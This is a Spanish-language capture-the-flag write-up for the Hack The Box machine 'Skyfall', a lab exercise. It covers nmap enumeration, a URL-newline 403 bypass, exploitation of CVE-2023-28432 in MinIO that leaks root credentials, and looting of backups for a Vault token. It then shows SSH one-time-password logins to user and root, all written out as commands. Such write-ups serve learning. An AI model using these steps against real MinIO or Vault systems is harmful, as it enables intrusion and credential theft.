---
title: "Skyfall - WriteUp"
date: Sat Nov 30 2024 08:45:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, cve-2023-28432, nmap, htb, cve, sudo, nginx, linux, ssh, bash]
image: /assets/img/htb-writeups/Pasted-image-20240209114816.png
---

{% include machine-info.html
  machine="Skyfall"
  os="Linux"
  difficulty="Insane"
  platform="HTB"
%}

![Skyfall](/assets/img/htb-writeups/Pasted-image-20240209114816.png)

---

---
Tags: 

-----

![SKYFALL](/assets/img/htb-writeups/Pasted-image-20240209114816.png)

----

#### ENUM

NMAP

```bash
# Nmap 7.94SVN scan initiated Fri Feb  9 11:49:47 2024 as: nmap -sCV -p 22,80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap
.xsl -oN targeted -oX targetedXML 10.129.226.119
Nmap scan report for 10.129.226.119
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![SKYFALL](/assets/img/htb-writeups/Pasted-image-20240209115242.png)

En el código fuente encontramos un subdominio y dominio de virtual hosting. Lo damos de alta.

![SKYFALL](/assets/img/htb-writeups/Pasted-image-20240209115417.png)

```http
WHATWEB:

$ whatweb http://10.129.226.119
http://10.129.226.119 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[askyy@skyfall.htb,btanner@skyfall.htb,contact@skyfall.com,jbond@skyfall.htb], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.226.119], Lightbox, Script, Title[Skyfall - Introducing Sky Storage!], nginx[1.18.0]

$ whatweb http://skyfall.htb
http://skyfall.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[askyy@skyfall.htb,btanner@skyfall.htb,contact@skyfall.com,jbond@skyfall.htb], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.226.119], Lightbox, Script, Title[Skyfall - Introducing Sky Storage!], nginx[1.18.0]

$ whatweb http://demo.skyfall.htb
http://demo.skyfall.htb [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.226.119], RedirectLocation[http://demo.skyfall.htb/login], Title[Redirecting...], probably Werkzeug, nginx[1.18.0]
http://demo.skyfall.htb/login [200 OK] Bootstrap, Cookies[session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux]
```

Posibles usuarios:
```
askyy@skyfall.htb
gmallory
omansfield
rsilva@skyfall.htb
askyy@skyfall.htb
emoneypenny@skyfall.htb
btanner@skyfall.htb
contact@skyfall.com
jbond@skyfall.htb
```

HTTP DEMO
![SKYFALL](/assets/img/htb-writeups/Pasted-image-20240209120043.png)

Entramos con las credenciales que nos muestra (guest/guest):

![SKYFALL](/assets/img/htb-writeups/Pasted-image-20240209120206.png)

A la izquierda del panel, podemos ver Min10 Métricas. ¡Cuando intentamos acceder a Min10 Metrices, muestra 403 prohibido!

Así que lo evité agregando %0a al final de la URL.

Copiar`http://demo.skyfall.htb/metrics%0a`

![Ninguno](https://miro.medium.com/v2/resize:fit:700/1*HJ7SIzkYkfNL7vpsuse_sA.png)

[http://demo.skyfall.htb/metrics%0a](http://demo.skyfall.htb/metrics%0a)

Podemos ver una URL en el punto final.

Copiar
 `http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster`

Agregue **prd23-s3-backend.skyfall.htb** al archivo /etc/hosts.

Encontramos una vulnerabilidad [CVE-2023–28432](https://www.cvedetails.com/cve/CVE-2023-28432/) .

[POC de GITHUB](https://github.com/acheiii/CVE-2023-28432.git)

Tenemos que probar esta **"vulnerabilidad de fuga de información"** sobre minio. Con esta vulnerabilidad, pude encontrar algunas credenciales sobre minio.

Utilice **BurpSuite** para interceptar y obtener credenciales.

Copiar`"MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww" "MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0"`

Para instalar **[el cliente Min10](https://min.io/docs/minio/linux/reference/minio-mc.html?source=post_page-----73c18ca3aa91--------------------------------)**

Ahora ejecutemos el cliente Min10.

Copiar``┌──(Batman㉿GC)-[~/minio-binaries] └─$ ./mc alias set myminio http://prd23-s3-backend.skyfall.htb/ 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0 Added `myminio` successfully.``

Busquemos archivos.

Copiar`┌──(Batman㉿GC)-[~/minio-binaries] └─$ ./mc ls -r --versions myminio                                                                         [2023-11-08 10:29:15 IST]     0B askyy/ [2023-11-08 11:05:28 IST]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf [2023-11-10 03:07:25 IST] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz [2023-11-10 03:07:09 IST] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz [2023-11-10 03:06:30 IST] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz [2023-11-08 10:28:56 IST]     0B btanner/ [2023-11-08 11:05:36 IST]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf [2023-11-08 10:28:33 IST]     0B emoneypenny/ [2023-11-08 11:05:56 IST]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf [2023-11-08 10:28:22 IST]     0B gmallory/ [2023-11-08 11:06:02 IST]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf [2023-11-08 05:38:01 IST]     0B guest/ [2023-11-08 05:38:05 IST]  48KiB STANDARD null v1 PUT guest/Welcome.pdf [2023-11-08 10:29:05 IST]     0B jbond/ [2023-11-08 11:05:45 IST]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf [2023-11-08 10:28:10 IST]     0B omansfield/ [2023-11-08 11:06:09 IST]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf [2023-11-08 10:28:45 IST]     0B rsilva/ [2023-11-08 11:05:51 IST]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf`

Aquí podemos encontrar algunos archivos de copia de seguridad con extensión **.gz** . Intenté descargar esos archivos y descomprimirlos.

Copiar`┌──(Batman㉿GC)-[~/minio-binaries] └─$ ./mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz . ...yy/home_backup.tar.gz: 2.64 KiB / 2.64 KiB ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.31 KiB/s 2s ┌──(Batman㉿GC)-[~/minio-binaries] └─$ ls home_backup.tar.gz ┌──(Batman㉿GC)-[~/minio-binaries] └─$ tar -xzvf home_backup.tar.gz   ./ ./.profile ./.bashrc ./.ssh/ ./.ssh/authorized_keys ./.sudo_as_admin_successful ./.bash_history ./.bash_logout ./.cache/ ./.cache/motd.legal-displayed`

Tras una mayor enumeración de archivos con **.gz** encontramos estos,

Copiar`export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb/" export VAULT_TOKEN="hvs.[REDACTED-CTF-TOKEN]"`

Para instalar **[VAULT](https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords?source=post_page-----73c18ca3aa91--------------------------------)** .

Agregue **prd23-vault-internal.skyfall.htb** al archivo /etc/hosts.

Ejecute el comando de la siguiente manera.

Copiar`export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb/" export VAULT_TOKEN="hvs.[REDACTED-CTF-TOKEN]" ┌──(Batman㉿GC)-[~/Downloads] └─$ ./vault login Token (will be hidden):  WARNING! The VAULT_TOKEN environment variable is set! The value of this variable will take precedence; if this is unwanted please unset VAULT_TOKEN or                                                              update its value accordingly.                                                                                                                                                                                                                                                           Success! You are now authenticated. The token information displayed below is already stored in the token helper. You do NOT need to run "vault login" again. Future Vault requests will automatically use this token. Key                  Value ---                  ----- token                hvs.[REDACTED-CTF-TOKEN] token_accessor       rByv1coOBC9ITZpzqbDtTUm8 token_duration       435850h57m1s token_renewable      true token_policies       ["default" "developers"] identity_policies    [] policies             ["default" "developers"]`

Principalmente, importe el archivo de configuración a Vault y luego verifique que el valor del token sea válido.

Para obtener acceso de usuario, ejecute el siguiente código, se generará una **OTP y utilizará la** **OTP** como contraseña de la conexión **SSH** .

Copiar`┌──(Batman㉿GC)-[~/Downloads] └─$ ./vault ssh -role dev_otp_key_role -mode otp askyy@10.10.11.254 Vault could not locate "sshpass". The OTP code for the session is displayed below. Enter this code in the SSH password prompt. If you install sshpass,                                                                  Vault can automatically perform this step for you.                                                                                          OTP for the session is: d1367bfe-8d4d-e3f5-2d7c-a85bd74be723 (askyy@10.10.11.254) Password:  Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)  * Documentation:  https://help.ubuntu.com  * Management:     https://landscape.canonical.com  * Support:        https://ubuntu.com/pro This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the 'unminimize' command. askyy@skyfall:~$ls user.txt askyy@skyfall:~$ cat user.txt 0031538fb5a589850------------ askyy@skyfall:~$`

**ESCALADA DE PRIVILEGIOS:**

Copiar`askyy@skyfall:~$ sudo -l Matching Defaults entries for askyy on skyfall:     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty User askyy may run the following commands on skyfall:     (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml [-vhd]*     (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml askyy@skyfall:~$`

Ejecuté **root/vault/vault-unseal -c /etc/vault-unseal.yaml** , pero no era accesible.

https://www.youtube.com/watch?v=pQtAk9OeC0k

https://blog.csdn.net/m0_52742680/article/details/136020022

```bash
./vault server -adm
```

```bash
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb/"
export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb/"
export VAULT_TOKEN="hvs.[REDACTED-CTF-TOKEN]"
```

```bash
./vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.129.226.119
./vault login
hvs.[REDACTED-ROOT-TOKEN]
./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no root@10.129.226.119

curl --header "X-Vault-Token: $VAULT_TOKEN" --request POST --data '{"ip":"10.129.226.119", "username":"root"}' $VAULT_ADDR/v1/ssh/creds/admin_otp_key_role
./vault ssh -role admin_otp_key_role -mode otp root@10.129.226.119
```
---

**Última actualización**: 2024-11-30<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
